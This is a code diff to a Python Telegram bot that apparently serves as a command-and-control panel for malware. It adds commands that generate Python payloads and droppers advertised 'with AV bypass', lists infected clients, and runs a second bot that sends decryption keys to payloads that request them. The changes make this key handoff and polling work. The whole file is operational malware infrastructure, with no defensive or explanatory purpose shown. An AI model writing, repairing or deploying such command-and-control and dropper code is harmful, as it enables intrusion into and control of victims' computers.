@@ -12,6 +12,7 @@ import tempfile
 import os
 import json
 import urllib.request
+import urllib.error
 from config import TOKEN, MASTER_SECRET, SALT, PAYLOAD_BOT_TOKEN
 from core.client_manager import ClientManager
 from core.payload_generator import PayloadGenerator
@@ -20,11 +21,12 @@ from core.crypto import CryptoHandler
 class BotController:
     def __init__(self):
         self.bot = telepot.Bot(TOKEN)
-        self.payload_bot = telepot.Bot(PAYLOAD_BOT_TOKEN)
 
         self.client_manager = ClientManager()
         self.crypto = CryptoHandler(MASTER_SECRET, SALT)
         self.payload_gen = PayloadGenerator(MASTER_SECRET, SALT, TOKEN, PAYLOAD_BOT_TOKEN)
+        self.payload_bot = telepot.Bot(PAYLOAD_BOT_TOKEN)
+        self.payload_bot_offset = None
         self.running = True
         self.key_store = {}
         self.pending_keys = {}
@@ -77,16 +79,16 @@ class BotController:
                 self.bot.sendMessage(chat_id, 'Usage: /generate_payload <command>')
                 return
             self.bot.sendMessage(chat_id, '⏳ Generating Python payload...')
-            payload, key_id = self.payload_gen.generate_payload(args, chat_id)
-            self.send_payload(chat_id, payload, key_id, 'Python Payload')
+            payload, key_id, key = self.payload_gen.generate_payload(args, chat_id)
+            self.send_payload(chat_id, payload, key_id, 'Python Payload', key)
 
         elif cmd == '/generate_dropper':
             if not args:
                 self.bot.sendMessage(chat_id, 'Usage: /generate_dropper <command>')
                 return
             self.bot.sendMessage(chat_id, '⏳ Generating dropper with AV bypass...')
-            dropper = self.payload_gen.generate_dropper(args, chat_id)
-            self.send_payload(chat_id, dropper, None, 'Python Dropper')
+            dropper, key_id, key = self.payload_gen.generate_dropper(args, chat_id)
+            self.send_payload(chat_id, dropper, key_id, 'Python Dropper', key)
 
         elif cmd == '/clients':
             self.list_clients(chat_id)
@@ -107,10 +109,11 @@ class BotController:
         else:
             self.bot.sendMessage(chat_id, f'[!] Unknown command: {cmd}')
 
-    def send_payload(self, chat_id, script, key_id, payload_type):
+    def send_payload(self, chat_id, script, key_id, payload_type, key=None):
         try:
             if key_id:
-                key = self.crypto.get_current_key()
+                if key is None:
+                    key = self.payload_gen.crypto.get_key(key_id)
                 self.key_store[key_id] = key
                 self.pending_keys[key_id] = chat_id
                 print(f'[MAIN] Stored key for {key_id}: {key[:20]}...')
@@ -145,21 +148,32 @@ class BotController:
             self.bot.sendMessage(chat_id, f'[!] Error: {e}')
 
     def process_payload_bot_requests(self):
-        """Temporary poll second bot for key requests, reply, then stop."""
+        """Poll the second bot for /getkey_<key_id> requests and reply with the stored key."""
         try:
-            url = f"https://api.telegram.org/bot{PAYLOAD_BOT_TOKEN}/getUpdates?limit=10&timeout=5"
+            url = f"https://api.telegram.org/bot{PAYLOAD_BOT_TOKEN}/getUpdates?limit=1&timeout=0"
+            if self.payload_bot_offset is not None:
+                url += f"&offset={self.payload_bot_offset}"
+
             req = urllib.request.Request(url)
-            resp = urllib.request.urlopen(req, timeout=10)
+            try:
+                resp = urllib.request.urlopen(req, timeout=10)
+            except urllib.error.HTTPError as e:
+                if e.code == 409:
+                    time.sleep(0.5)
+                    return
+                raise
+
             data = json.loads(resp.read().decode())
 
             if data.get('ok'):
                 for update in data.get('result', []):
+                    self.payload_bot_offset = update.get('update_id', self.payload_bot_offset or 0) + 1
                     msg = update.get('message', {})
                     chat_id = msg.get('chat', {}).get('id')
                     text = msg.get('text', '')
 
                     if text.startswith('/getkey_'):
-                        key_id = text[8:].strip()
+                        key_id = text[len('/getkey_'):].strip()
                         print(f'[PAYLOAD BOT] Request for key_id: {key_id}')
                         print(f'[PAYLOAD BOT] Current key_store keys: {list(self.key_store.keys())}')
                         if key_id in self.key_store:
@@ -188,7 +202,7 @@ class BotController:
         def check_second_bot():
             while self.running:
                 self.process_payload_bot_requests()
-                time.sleep(3)  # Poll every 3 seconds – very short, no conflict
+                time.sleep(3)
 
         poll_thread = threading.Thread(target=check_second_bot, daemon=True)
         poll_thread.start()
